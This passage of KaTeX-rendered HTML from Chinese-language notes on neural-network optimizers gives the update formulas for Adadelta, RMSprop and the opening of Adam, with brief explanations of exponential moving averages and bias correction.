mathvariant="normal">△</mi><mi>θ</mi><mn>2</mn><msub><mo stretchy="false">]</mo><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>γ</mi><mo stretchy="false">)</mo><mi mathvariant="normal">△</mi><msubsup><mi>θ</mi><mi>t</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">E[\triangle\theta^2]_t=\gamma E[\triangle \theta2]_{t-1}+(1-\gamma)\triangle\theta^2_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord">△</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord">2</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mclose">)</span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mi>M</mi><mi>S</mi><mo stretchy="false">[</mo><mi mathvariant="normal">△</mi><mi>θ</mi><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>=</mo><msqrt><mrow><mi>E</mi><mo stretchy="false">[</mo><mi mathvariant="normal">△</mi><msup><mi>θ</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>+</mo><mi>ε</mi></mrow></msqrt></mrow><annotation encoding="application/x-tex">RMS[\triangle\theta]_t=\sqrt{E[\triangle\theta^2]_t+\varepsilon}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">[</span><span class="mord">△</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.24em;vertical-align:-0.30499999999999994em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.935em;"><span class="svg-align" style="top:-3.2em;"><span class="pstrut" style="height:3.2em;"></span><span class="mord" style="padding-left:1em;"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord">△</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">ε</span></span></span><span style="top:-2.8950000000000005em;"><span class="pstrut" style="height:3.2em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em;"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120c340,-704.7,510.7,-1060.3,512,-1067c4.7,-7.3,11,-11,19,-11H40000v40H1012.3s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z M1001 80H40000v40H1012z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.30499999999999994em;"><span></span></span></span></span></span></span></span></span></li></ul></li></ul></li></ul><h4 id="rmsprop"><a class="markdownIt-Anchor" href="#rmsprop"></a> RMSprop</h4><ul><li>RMSProp是一个未正式发表的自适应学习率方法；由Geoff Hinton提出</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>=</mo><mn>0.9</mn><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mn>0.1</mn><msup><mi>g</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">E[g^2]_t=0.9E[g^2]_{t-1}+0.1g^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>θ</mi><mi>t</mi></msub><mo>−</mo><mfrac><mn>1</mn><msqrt><mrow><mi>E</mi><mo stretchy="false">[</mo><msup><mi>g</mi><mn>2</mn></msup><msub><mo stretchy="false">]</mo><mi>t</mi></msub><mo>+</mo><mi>ε</mi></mrow></msqrt></mfrac><msub><mi>g</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\theta_{t+1}=\theta_{t}-\frac{1}{\sqrt{E[g^2]_t+\varepsilon}}g_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.6747079999999999em;vertical-align:-0.8295999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.4641625em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0369107142857144em;"><span class="svg-align" style="top:-3.428571428571429em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="mord mtight" style="padding-left:1.19em;"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span><span class="mopen mtight">[</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose mtight"><span class="mclose mtight">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">ε</span></span></span><span style="top:-3.0089107142857143em;"><span class="pstrut" style="height:3.428571428571429em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.5428571428571431em;"><svg width='400em' height='1.5428571428571431em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4196607142857143em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8295999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>Hinton建议𝛾 设为 0.9, 学习率𝜂 的默认值为0.001</li><li>RMSProp方法并不是将过去所有的梯度一视同仁地相加，而是逐渐地遗忘过去的梯度，在做加法运算时将新梯度的信息更多地反映出来。即采用“指数移动平均”：最近 1/(1 − 𝛾) 个时间步的小批量随机梯度平方项的加权平均。</li></ul><h4 id="adam"><a class="markdownIt-Anchor" href="#adam"></a> Adam</h4><ul><li><p>Adam是另外一种为每一参数计算自适应学习率的方法，除了像Adadelta和RMSprop存储过去梯度平方的指数衰减平均值𝑣𝑡, Adam也保留了过去梯度的指数衰减平均值𝑚𝑡, 类似动量</p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>m</mi><mi>t</mi></msub><mo>=</mo><msub><mi>β</mi><mn>1</mn></msub><msub><mi>m</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>β</mi><mn>1</mn></msub><mo stretchy="false">)</mo><msub><mi>g</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">m_t=\beta_1m_{t-1}+(1-\beta_1)g_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>v</mi><mi>t</mi></msub><mo>=</mo><msub><mi>β</mi><mn>2</mn></msub><msub><mi>v</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><msub><mi>β</mi><mn>2</mn></msub><mo stretchy="false">)</mo><msubsup><mi>g</mi><mi>t</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">v_t=\beta_2v_{t-1}+(1-\beta_2)g_t^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>𝑚𝑡 和𝑣𝑡分别是一阶矩(均值) 和梯度二阶矩(有偏方差) 的估计值，含有偏差校正（bias-corrected） 的一阶矩和二阶矩 的估计:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi>m</mi><mo>^</mo></mover><mi>t</mi></msub><mo>=</mo><mfrac><msub><mi>m</mi><mi>t</mi></msub><mrow><mn>1</mn><mo>−</mo><msubsup><mi>β</mi><mn>1</mn><mi>t</mi></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\hat{m}_t=\frac{m_t}{1-\beta_1^t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.288452em;vertical-align:-0.5769599999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7114919999999999em;"><span style="top:-2.6411000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7841428571428571em;"><span style="top:-2.188485714285714em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.31151428571428574em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 